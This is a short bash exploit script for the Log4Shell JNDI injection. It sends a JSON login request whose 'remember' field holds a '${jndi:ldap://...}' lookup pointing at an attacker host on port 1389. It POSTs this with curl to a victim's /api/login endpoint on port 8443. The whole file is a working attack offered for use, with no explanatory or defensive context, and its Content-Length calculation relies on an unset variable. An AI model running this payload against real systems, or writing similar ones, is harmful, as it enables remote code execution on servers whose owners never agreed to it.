#!/bin/bash
set -x
# Get var from env
hostname=$ATTACKER
victim=$VICTIM


payload='{"username":"admin","password":"admin","remember":"${jndi:ldap://'$hostname':1389/o=tomcat}","strict":true}'
echo $payload
echo length=`echo $payload| wc -c`
cl=`echo $length -1 | bc`

curl -i -s -k -X POST -H $"Host: $victim:8443" -H 'Content-Length: '$cl --data-binary "$payload" $"https://$victim:8443/api/login"

